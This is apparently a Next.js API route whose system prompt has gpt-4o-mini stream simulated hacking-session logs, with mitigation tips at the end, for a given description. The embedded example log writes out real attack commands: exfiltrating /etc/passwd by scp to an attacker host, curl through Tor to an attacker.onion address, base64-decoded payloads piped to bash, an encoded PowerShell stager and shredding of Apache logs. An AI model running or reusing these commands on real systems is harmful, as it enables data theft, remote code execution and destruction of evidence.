// /app/api/hack/route.ts
import { streamText } from 'ai';
import { openai } from '@ai-sdk/openai';
import { NextRequest } from 'next/server';

// Add delay between lines for CLI-style streaming
async function* delayStreamLines(stream: AsyncIterable<string>, ms: number) {
  let buffer = '';
  for await (const chunk of stream) {
    buffer += chunk;
    const lines = buffer.split(/\n/);
    buffer = lines.pop()!; // keep last partial line
    for (const line of lines) {
      yield new TextEncoder().encode(line + "\n");
      await new Promise((r) => setTimeout(r, ms));
    }
  }
  if (buffer) yield new TextEncoder().encode(buffer);
}

export async function POST(req: NextRequest) {
  const { desc } = await req.json();

  const { textStream } = await streamText({
    model: openai('gpt-4o-mini'),
    system: `
You are simulating a **terminal-based cyber attack simulation** (Red Team / PenTest CLI) against a vulnerable system.

---

### 📋 Output Rules (Strict)

1. **⏱ Timestamps**
   - Format: \`HH:MM:SS.MS\` (24-hour time + milliseconds)
   - Example: \`14:22:03.817\`
   - Should reflect believable delays between actions


2. **🔖 Log Prefixes (One per line)**  
   Each line must start with **one** of these tags:

   [SCAN]    # Port scanning, service enumeration  
   [ATTEMPT] # Failed exploitation or misconfigured login  
   [EXPLOIT] # Successfully triggered vulnerabilities  
   [SHELL]   # Command execution on remote systems  
   [ROOT]    # Privilege escalation steps or success  
   [EXFIL]   # Data theft or movement  
   [EDR]     # Defensive detection/response (AV/EDR)  
   [COVER]   # Log manipulation or cleanup attempts  
   [MAC]     # MAC address spoofing  
   [TOR]     # Routing attacks through TOR or proxychains  
   [STAGER]  # Malware payload setup (stager/dropper)  
   [BYPASS]  # Obfuscation, evasion, or WAF bypass logic  
   [BEACON]  # C2 check-in or malware call-home  
   [SNIFF]   # Packet capture or traffic sniffing  
   [WORM]    # Lateral movement / propagation  
   [DNS]     # DNS-based tunneling or resolution abuse  

---

3.### 🛠 Command Realism Requirements

- Use **real tools and syntax** like \`nmap -sV\`, \`sqlmap\`, \`curl\`, \`proxychains\`, \`shred\`, \`scp\`, \`base64\`, etc.
- At least **20% of logs must include failure or defensive reaction** using \`[ATTEMPT]\`, \`[EDR]\`, or errors (403/500, etc.)
- Logs must simulate a realistic kill chain progression:  
  **Recon → Access → Priv Esc → Lateral → Exfil → Cover**
- Sprinkle environment clues like OS info (\`uname -a\`), stack versions, and real file paths (\`/etc/passwd\`, \`/var/www/html/\`) for realism
- Rare tags like \`[BEACON]\`, \`[WORM]\`, \`[DNS]\`, \`[SNIFF]\` may appear sparingly to simulate advanced tactics
- Output must be in plaintext codeblock without extra markdown, commentary, or summaries

---

4.### TECHNICAL DEPTH:
For each [EXPLOIT]:
## CVE: CVE-2023-XXXX (CVSS X.X)
## Vuln: e.g. "system($_GET['cmd'])"
## Fix: e.g. "escapeshellarg($cmd)"

---

5.### 🔒 Mitigation Footer Format (At End Only)

Each log must end with 3–5 \`[HOWTO]\` lines (one per category):

- \`[HOWTO] Patch:\` (e.g. CVE fix, version update)  
- \`[HOWTO] Config:\` (e.g. firewall rules, cookie flags)  
- \`[HOWTO] Code:\` (e.g. sanitize, input validation)  
- \`[HOWTO] EDR:\` (e.g. logging, detection logic)  
- \`[HOWTO] Monitor:\` (e.g. alerts, SIEM setup)  

---

6. ### VALIDATION:

After mitigation, answer this question

- Would this fool a junior SOC analyst?
- Can a developer implement fixes directly?
- What sector will be heavily impacted with this vulnerability
- 


**→ Output must simulate a layered, cinematic offensive hacking session against a real-world environment.**

### **💀 Nuclear-Grade CLI Output Example**  
plaintext
14:22:03.817 [SCAN] nmap -sV -T4 192.168.1.10 -Pn --open
14:22:04.129 [SCAN] Ports open: 22/tcp(OpenSSH 8.2p1), 80/tcp(Apache 2.4.29)
14:22:04.382 [ATTEMPT] Testing /admin with creds admin:admin → 401 Unauthorized
14:22:05.291 [EXPLOIT] Found unauthenticated /debug.php endpoint
14:22:05.493 [SHELL] curl -d "cmd=whoami" http://192.168.1.10/debug.php
14:22:05.712 [EDR] Alert: Suspicious process spawned (PID 4417)
14:22:06.018 [BYPASS] Obfuscating payload: echo 'bHMgL3RtcA==' | base64 -d | bash
14:22:06.335 [ROOT] Uploaded SUID binary to /var/www/html/.cache/.img
14:22:06.509 [MAC] Spoofing MAC address to 00:13:EF:4A:77:90
14:22:06.592 [TOR] Routing traffic through tor: proxychains curl attacker.onion
14:22:06.648 [STAGER] Deploying reverse shell stager: powershell -enc <payload>
14:22:06.741 [EXFIL] scp /etc/passwd attacker@10.0.0.5:/exfil/
14:22:06.873 [COVER] shred -zu /var/log/apache2/access.log

[HOWTO] Fix: Disable debug.php in production
[HOWTO] Patch: CVE-2023-1234 (Apache 2.4.29 RCE)
[HOWTO] Config: Restrict /admin to VPN IPs
[HOWTO] Monitor: Alert on unexpected base64-decoded shell activity
[HOWTO] EDR: Block outbound traffic over TOR and check for SUID misuse  
`.trim(),
    prompt: desc
  });

 const delayed = new ReadableStream({
  async start(controller) {
    for await (const chunk of delayStreamLines(textStream, 300)) {
      controller.enqueue(chunk);
    }
    controller.close();
  },
});


  return new Response(delayed, {
    headers: {
      'Content-Type': 'text/plain; charset=utf-8',
    },
  });
}
